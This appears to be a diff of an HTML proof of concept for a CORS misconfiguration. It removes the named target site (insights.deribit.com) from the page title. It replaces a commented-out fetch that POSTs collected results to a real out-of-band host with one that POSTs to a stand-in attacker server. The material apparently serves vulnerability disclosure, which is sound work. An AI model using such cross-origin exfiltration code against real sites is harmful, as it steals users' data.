@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Vulnerability PoC - insights.deribit.com</title>
+    <title>CORS Vulnerability PoC</title>
 </head>
 <body>
     <h1>CORS Misconfiguration PoC</h1>
@@ -51,10 +51,10 @@
             if (results.some(r => r.data)) {
                 console.log("Exfiltrating data to attacker server would happen here");
                 // Dalam PoC nyata, Anda bisa menambahkan kode untuk mengirim data ke server attacker
-               // fetch('https://csxaipansspdddzbhzffraz5k2s7ug7r1.oast.fun/collect', { 
-               //     method: 'POST',
-              //      body: JSON.stringify(results)
-              //   });
+                // fetch('https://attacker-server.com/collect', { 
+                //     method: 'POST',
+                //     body: JSON.stringify(results)
+                // });
             }
         });
     </script>
